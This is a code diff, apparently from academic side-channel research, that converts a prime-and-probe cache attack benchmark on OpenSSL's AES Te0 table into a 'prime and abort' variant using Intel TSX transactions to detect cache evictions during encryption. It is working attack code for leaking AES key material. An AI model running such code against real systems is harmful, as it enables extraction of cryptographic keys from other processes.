@@ -1,7 +1,7 @@
 /**
- * This file is has been copied from xlate/aes-pp.c and been modified slightly in order to make it easier to benchmark the prime and probe algorithm
+ * This file is has been copied from xlate/aes-pa.c and been modified slightly in order to make it easier to benchmark the prime and abort algorithm
  */
-#include<aes-pp-helper.h>
+#include "aes-pa-helper.h"
 
 void *crypto_find_te0(int fd)
 {
@@ -24,16 +24,45 @@ void *crypto_find_te0(int fd)
 	return base;
 }
 
+int cmp_size(const void *lhs, const void *rhs)
+{
+	return memcmp(lhs, rhs, sizeof(size_t));
+}
+
+int prime_and_abort(struct list *working_set, void *line)
+{
+	struct list *node;
+	size_t ncommits = 0;
+	size_t naborts = 0;
+	unsigned ret;
+
+	while (ncommits < 16 && naborts < 16) {
+		list_foreach(working_set, node);
+		*(volatile char *)line;
+
+		if ((ret = xbegin()) == XBEGIN_INIT) {
+			list_foreach(working_set, node);
+			*(volatile char *)line;
+			xend();
+
+			++ncommits;
+		} else if (ret & XABORT_CAPACITY) {
+			++naborts;
+		}
+	}
+
+	return ncommits == 0;
+}
+
 unsigned char key_data[32] = { 0 };
 
 unsigned char plain[16];
 unsigned char cipher[128];
 unsigned char restored[128];
 
-
 	AES_KEY key;
+	struct list *node;
 	struct list set;
-	uint64_t dt;
 	struct stat stat;
 	struct page_set lines, wset;
 	int fd;
@@ -46,8 +75,10 @@ unsigned char restored[128];
 	size_t i, j;
 	size_t byte;
 	size_t nways = 16;
+	unsigned ret;
 
-void set_up_pp(char* libcrypto_path){
+void set_up_pa(char * libcrypto_path)
+{
 	if ((fd = open(libcrypto_path, O_RDONLY)) < 0) {
 		perror("open");
 		return -1;
@@ -69,22 +100,19 @@ void set_up_pp(char* libcrypto_path){
 	}
 
 	build_page_pool(&lines, 4096);
-
 	AES_set_encrypt_key(key_data, 128, &key);
 
 	page_set_init(&wset, 16);
-
 }
 
-void execute_pp()
-{
+void execute_pa(){
 	for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64) {
 		if (!colour || colour != ((uintptr_t)cl & ~(4 * KIB - 1))) {
 			for (i = 0; i < wset.len; ++i) {
 				page_set_push(&lines, wset.data[i]);
 			}
 
-			find_wset(&lines, &wset, NULL, cl, 16, prime_and_probe);
+			find_wset(&lines, &wset, NULL, cl, nways, prime_and_abort);
 			limit_wset(&lines, &wset, nways);
 
 			colour = ((uintptr_t)cl & ~(4 * KIB - 1));
@@ -101,23 +129,19 @@ void execute_pp()
 			plain[0] = byte;
 			int64_t score = 0;
 
-			prime(&set);
-
 			for (round = 0; round < 1000000; ++round) {
 				for (i = 1; i < 16; ++i) {
 					plain[i] = rand() % 256;
 				}
 
-				AES_encrypt(plain, cipher, &key);
-				sched_yield();
+				if ((ret = xbegin()) == XBEGIN_INIT) {
+					list_foreach(&set, node);
 
-				dt = prime(&set);
+					AES_encrypt(plain, cipher, &key);
+					xend();
 
-				if (dt < 600)
-					--score;
-
-				if (dt > 750)
 					++score;
+				}
 			}
 
 			printf("%" PRId64 " ", score);
@@ -134,6 +158,6 @@ void execute_pp()
 	}
 }
 
-void clean_up_pp(){
+void clean_up_pa(){
 	close(fd);
 }
